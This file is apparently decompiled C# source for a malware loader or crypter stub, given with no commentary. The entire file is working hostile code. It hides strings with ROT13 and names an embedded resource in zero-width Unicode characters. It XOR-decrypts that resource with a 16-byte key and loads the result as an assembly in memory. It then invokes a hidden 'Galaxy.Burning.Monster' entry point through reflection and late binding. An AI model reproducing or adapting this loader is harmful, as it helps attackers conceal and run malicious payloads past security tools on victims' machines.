using System;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace K120;

public class Burnout
{
	public static byte[] fileBytes;

	public static string C;

	public static string M;

	public static string refAsm;

	public static string refLoad;

	public static string refType;

	public static string refMethod;

	public static string refInvoke;

	private static object refLoad_0 => RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateCall((object)null, Type.GetType(refAsm), refLoad, new object[1] { file }, (string[])null, (Type[])null, (bool[])null, false)));

	private static object refType_0 => RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(args), (Type)null, refType, new object[1] { C }, (string[])null, (Type[])null, (bool[])null, false)));

	private static object refMethod_0 => RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(args), (Type)null, refMethod, new object[1] { M }, (string[])null, (Type[])null, (bool[])null, false)));

	private static byte[] LibGet
	{
		get
		{
			ResourceManager resourceManager = new ResourceManager("\u200c\u200d\u200e\u200c\u200c\u200d\u200b\u200d\u200d\u200d\u200e\u200b\u200c\u200e\u200b\u200d\u200d\u200c\u200b\u200c\u200e\u200b\u200b\u200c\u200d\u200b\u200b\u200b\u200e\u200c\u200d\u200d\u200c\u200b\u200e\u200c\u200e\u200d\u200b\u200c\u200c\u200b\u200e\u200d\u200d\u200d\u200d\u200e\u200b\u200e\u200d\u200d\u200c\u200e\u200d\u200b\u200b\u200d\u200d\u200e\u200d\u200c\u200c\u200c\u200c\u200e\u200c\u200b\u200e\u200c\u200b\u200e\u200d\u200e\u200e\u200d\u200c\u200c\u200c\u200b\u200b\u200b\u200b\u200c\u200d\u200d\u200b\u200b\u200e\u200e\u200b\u200c\u200c\u200e\u200d\u200e\u200d\u200e\u200b\u200e\u200d\u200b\u200c\u200e\u200d\u200d\u200b\u200e\u200b\u200c\u200d\u200d\u200d\u200d\u200e\u200d\u200d\u200d\u200e\u200b\u200e\u200d\u200b\u200b\u200b\u200d\u200e\u200e\u200e\u200d\u200c\u200c\u200d\u200b\u200d\u200c\u200c\u200d\u200c\u200b\u200e\u200b\u200d\u200b\u200c\u200c\u200d\u200b\u200e\u200c\u200c\u200e\u200e\u200b\u200c\u200b\u200e\u200c\u200d\u200d\u200c\u200d\u200b\u200e\u200e\u200d\u200c\u200c\u200b\u200b\u200b\u200c\u200e\u200d\u200b\u200b\u200c\u200b\u200b\u200c\u200e\u200c\u200d\u200d\u200d\u200e\u200c\u200e", ReadCurrentAssembly);
			return PolyIndia((byte[])NewLateBinding.LateGet((object)Encoding.Default, (Type)null, "GetBytes", new object[1] { RuntimeHelpers.GetObjectValue(resourceManager.GetObject("\u200c\u200d\u200e\u200e\u200c\u200c\u200c\u200e\u200d\u200e\u200d\u200b\u200b\u200e\u200c\u200b\u200e\u200e\u200c\u200e\u200e\u200d\u200e\u200b\u200d\u200d\u200e\u200b\u200b\u200d\u200b\u200b\u200c\u200e\u200e\u200b\u200c\u200c\u200e\u200b\u200d\u200e\u200c\u200c\u200b\u200b\u200d\u200d\u200c\u200c\u200c\u200b\u200c\u200e\u200d\u200e\u200e\u200d\u200c\u200d\u200e\u200d\u200d\u200c\u200e\u200b\u200b\u200c\u200b\u200c\u200e\u200d\u200b\u200c\u200d\u200c\u200d\u200c\u200b\u200b\u200b\u200b\u200e\u200b\u200b\u200b\u200d\u200e\u200e\u200d\u200b\u200b\u200b\u200d\u200e\u200d\u200b\u200b\u200b\u200b\u200c\u200c\u200c\u200e\u200b\u200e\u200e\u200b\u200d\u200c\u200d\u200b\u200e\u200b\u200d\u200b\u200b\u200e\u200c\u200d\u200c\u200e\u200b\u200c\u200d\u200c\u200b\u200d\u200c\u200e\u200b\u200e\u200c\u200b\u200d\u200d\u200d\u200e\u200b\u200b\u200e\u200e\u200b\u200d\u200e\u200c\u200c\u200d\u200d\u200e\u200e\u200e\u200d\u200d\u200d\u200e\u200e\u200c\u200d\u200e\u200b\u200d\u200c\u200c\u200d\u200d\u200b\u200d\u200d\u200c\u200e\u200e\u200c\u200e\u200d\u200c\u200d\u200b\u200b\u200c\u200c\u200e\u200c\u200c\u200d\u200e\u200d\u200c\u200e\u200d\u200b\u200b\u200e\u200d\u200b\u200b\u200c\u200b\u200c\u200e\u200b\u200d\u200d\u200e\u200d\u200d\u200c\u200e\u200c\u200b\u200c\u200c\u200c\u200d\u200d\u200c\u200c\u200b\u200c\u200e\u200b\u200c\u200e\u200d\u200e\u200e\u200e\u200e\u200c\u200c\u200b\u200c\u200e\u200d\u200b\u200c\u200e\u200c\u200d\u200c\u200c\u200b\u200b\u200b\u200e\u200c\u200c\u200c\u200e\u200d\u200e\u200b\u200d\u200b\u200e\u200e\u200e\u200c\u200e\u200b\u200b\u200e\u200c\u200d\u200b\u200d\u200c\u200e\u200e\u200d\u200d\u200d\u200c\u200c\u200c\u200e\u200e\u200d\u200c\u200e\u200c\u200d\u200e\u200c\u200d\u200d\u200c\u200e\u200c\u200c\u200b\u200d\u200c\u200d\u200c\u200b\u200b\u200b\u200e\u200b\u200b\u200e\u200c\u200e\u200b\u200c\u200e\u200e\u200c\u200e\u200c\u200d\u200c\u200d\u200b\u200d\u200b\u200e\u200d\u200c\u200e\u200e\u200b\u200d\u200c\u200e\u200d\u200e\u200e\u200e\u200b\u200e\u200d\u200e\u200e\u200c\u200d\u200c\u200e\u200c\u200b\u200e\u200e\u200b\u200d\u200c\u200c\u200d\u200e\u200d\u200d\u200c\u200b\u200c\u200b\u200d\u200c\u200b\u200b\u200e\u200c\u200b\u200e\u200b\u200d\u200c\u200e\u200e\u200e\u200e\u200c\u200c\u200e\u200e\u200e\u200e\u200c\u200d\u200b\u200d\u200b\u200d\u200e\u200e\u200e\u200c\u200c\u200e\u200b\u200c\u200e\u200b\u200d\u200d\u200c\u200e\u200e\u200d\u200e\u200b\u200e\u200b\u200e\u200c\u200c\u200e\u200b\u200c\u200b\u200d\u200b\u200c\u200c\u200e\u200c\u200d\u200d\u200e\u200b\u200e\u200e\u200e\u200e\u200b\u200e\u200e\u200d\u200c\u200d\u200d\u200e\u200c\u200c\u200b\u200d\u200e\u200c\u200b\u200c\u200e\u200e\u200c\u200c\u200b\u200e\u200c\u200d\u200e\u200d\u200b\u200d\u200c\u200c\u200b\u200d\u200b\u200e\u200b\u200d\u200b\u200c\u200e\u200b\u200d\u200e\u200d\u200c\u200e\u200d\u200e\u200b\u200c\u200b\u200d\u200c\u200b\u200c\u200b\u200c\u200d\u200e\u200b\u200e\u200e\u200e\u200e\u200b\u200b\u200b\u200c\u200b\u200d\u200d\u200d\u200b\u200c\u200c\u200e\u200e\u200d\u200e\u200e\u200d\u200c\u200b\u200d\u200d\u200d\u200c\u200c\u200b\u200e\u200d\u200b\u200c\u200b\u200c\u200e\u200d\u200b\u200e\u200e\u200b\u200b\u200c\u200d\u200d\u200d\u200c\u200b\u200d\u200d\u200b\u200e\u200d\u200b\u200d\u200d\u200e\u200b\u200e\u200d\u200e\u200d\u200b\u200b\u200e\u200b\u200b\u200e\u200b\u200b\u200e\u200c\u200c\u200e\u200e\u200c\u200b\u200c\u200e\u200b\u200b\u200e\u200e\u200e\u200c\u200d\u200c\u200d\u200b\u200d\u200b\u200d\u200e\u200b\u200e\u200e\u200e\u200e\u200b\u200c\u200e\u200e\u200b\u200d\u200e\u200d\u200e\u200e\u200e\u200e\u200d\u200b\u200e\u200e\u200b\u200c\u200b\u200e\u200b\u200b\u200e\u200e\u200b\u200b\u200b\u200d\u200c\u200d\u200d\u200e\u200b\u200d\u200d\u200e\u200d\u200b\u200d\u200d\u200c\u200c\u200c\u200c\u200c\u200e\u200b\u200d\u200b\u200b\u200e\u200c\u200c\u200c\u200e\u200d\u200d\u200d\u200c\u200e\u200c\u200b\u200e\u200b\u200d\u200b\u200c\u200d\u200e\u200d\u200c\u200d\u200e\u200b\u200d\u200e\u200c\u200b\u200e\u200b\u200e\u200c\u200c\u200e\u200d\u200b\u200d\u200c\u200c\u200d\u200c\u200d\u200d\u200e\u200e\u200e\u200b\u200c\u200b\u200c\u200b\u200d\u200d\u200b\u200b\u200d\u200d\u200e\u200c\u200b\u200c\u200d\u200b\u200d\u200c\u200b\u200e\u200d\u200d\u200c\u200c\u200c\u200c\u200c\u200c\u200d\u200e\u200e\u200c\u200e\u200c\u200e\u200c\u200d\u200d\u200c\u200b\u200e\u200e\u200e\u200e\u200e\u200b\u200c\u200e\u200d\u200c\u200e\u200c\u200d\u200c\u200d\u200e\u200e\u200b\u200c\u200e\u200d\u200b\u200c\u200c\u200e\u200b\u200e\u200c\u200c\u200d\u200e\u200b\u200b\u200e\u200c\u200e\u200b\u200e\u200b\u200d\u200e\u200c\u200e\u200c\u200d\u200e\u200b\u200b\u200c\u200e\u200b\u200b\u200e\u200e\u200c\u200b\u200b\u200b\u200b\u200b\u200b\u200d\u200d")) }, (string[])null, (Type[])null, (bool[])null));
		}
	}

	private static Assembly ReadCurrentAssembly => Assembly.GetCallingAssembly();

	[STAThread]
	public static void Main()
	{
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string[] paramArr = new string[2] { "Tnynkl.Oheavat", "Zbafgre" };
			string[] varArr = new string[5] { "Flfgrz.Ersyrpgvba.Nffrzoyl", "Ybnq", "TrgGlcr", "TrgZrgubq", "Vaibxr" };
			FuckWorld(LibGet, paramArr, varArr);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			Interaction.MsgBox((object)("1: " + ex2.Message), (MsgBoxStyle)0, (object)null);
			ProjectData.ClearProjectError();
		}
	}

	private static byte[] Intercation(string input)
	{
		return (byte[])RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateCall((object)null, Type.GetType(Refraction("Flfgrz.Pbaireg")), Refraction("SebzOnfr64Fgevat"), new object[1] { input }, (string[])null, (Type[])null, (bool[])null, false)));
	}

	private static string Refraction(string value)
	{
		int num = 97;
		int num2 = 122;
		int num3 = 109;
		int num4 = 65;
		int num5 = 90;
		int num6 = 77;
		char[] array = value.ToCharArray();
		checked
		{
			int num7 = array.Length - 1;
			for (int i = 0; i <= num7; i++)
			{
				int num8 = Strings.Asc(array[i]);
				if (num8 >= num && num8 <= num2)
				{
					num8 = ((num8 <= num3) ? (num8 + 13) : (num8 - 13));
				}
				else if (num8 >= num4 && num8 <= num5)
				{
					num8 = ((num8 <= num6) ? (num8 + 13) : (num8 - 13));
				}
				array[i] = Strings.Chr(num8);
			}
			return new string(array);
		}
	}

	public static void FuckWorld(byte[] File, string[] paramArr, string[] varArr)
	{
		fileBytes = File;
		C = Refraction(paramArr[0]);
		M = Refraction(paramArr[1]);
		refAsm = Refraction(varArr[0]);
		refLoad = Refraction(varArr[1]);
		refType = Refraction(varArr[2]);
		refMethod = Refraction(varArr[3]);
		refInvoke = Refraction(varArr[4]);
		RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(Burnout.get_refMethod_0(RuntimeHelpers.GetObjectValue(Burnout.get_refType_0(RuntimeHelpers.GetObjectValue(Burnout.get_refLoad_0(fileBytes)))))), (Type)null, refInvoke, new object[2]
		{
			null,
			new object[0]
		}, (string[])null, (Type[])null, (bool[])null, false)));
	}

	public static byte[] PolyIndia(byte[] data)
	{
		checked
		{
			byte[] array = new byte[data.Length - 16 - 1 + 1];
			Buffer.BlockCopy(data, 16, array, 0, array.Length);
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = unchecked((byte)(array[i] ^ data[i % 16]));
			}
			return array;
		}
	}
}
